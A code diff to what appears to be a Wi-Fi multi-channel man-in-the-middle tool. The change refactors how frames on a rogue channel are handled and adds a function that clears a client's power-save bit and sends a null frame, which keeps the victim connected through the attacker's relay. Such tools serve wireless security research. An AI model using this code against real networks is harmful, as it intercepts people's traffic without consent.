@@ -29,7 +29,7 @@ PProcess McMitm::handle_probe(const HWAddress<6> addr2, const PDU *pdu, const Do
 		client_state.update_state(ClientState::Finding);
 		probe_resp->addr1(addr2);
 
-		const auto resp = probe_resp->clone();
+		const unique_ptr<Dot11ProbeResponse> resp(probe_resp->clone());
 		resp->addr1(addr2);
 		if(hooks)
 			hooks->on_probe_response(*resp->find_pdu<Dot11ProbeResponse>());
@@ -135,6 +135,18 @@ PProcess McMitm::handle_eapol_rogue(const HWAddress<6> addr1, const HWAddress<6>
 	return CONTINUE;
 }
 
+void McMitm::power_mgmt_response_rogue(HWAddress<6> addr2, Dot11 &dot11) const {
+	if(dot11.addr1() != ap.get(SK::mac)) return;
+	if(!dot11.power_mgmt() || client_state.get_mac() != addr2) return;
+
+	log(LogLevel::WARNING, "Client {} is going to sleep on rogue channel. Removing sleep bit.", addr2);
+	dot11.power_mgmt(0);
+	Dot11Data null_frame(addr2, HWAddress<6>(ap.get(SK::mac)));
+	null_frame.subtype(Dot11::DATA_NULL);
+	null_frame.addr3(HWAddress<6>(ap.get(SK::mac)));
+	send_to_rogue(null_frame);
+}
+
 void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu, const vector<uint8_t> &raw){
 	auto *dot11 = pdu->find_pdu<Dot11>();
 	if(!dot11) return;
@@ -151,8 +163,9 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu, const vector<uint8
 	if(addr2 == HWAddress<6>() && dot11->type() != Dot11::CONTROL){
 		log(LogLevel::DEBUG, "Rogue_cannel: Unknown frame type");
 		return;
-
 	}
+
+	power_mgmt_response_rogue(addr2, *dot11);
 
 	#define SOLVE_OR_CONTINUE(handle_fun) if(handle_fun) return;
 
@@ -176,11 +189,6 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu, const vector<uint8
 		}
 	} else if(dot11->addr1() == ap.get(SK::mac)){ // -> AP
 		if(client_state.get_mac() == addr2){
-			// remove sleep option
-			if(dot11->power_mgmt()){
-				log(LogLevel::WARNING, "Client {} is going to sleep on rogue channel. Removing sleep bit.", addr2);
-				dot11->power_mgmt(0);
-			}
 			send_to_real(*pdu);
 			display_traffic(*pdu, "Rogue channel", " -- MitM'ing");
 		}
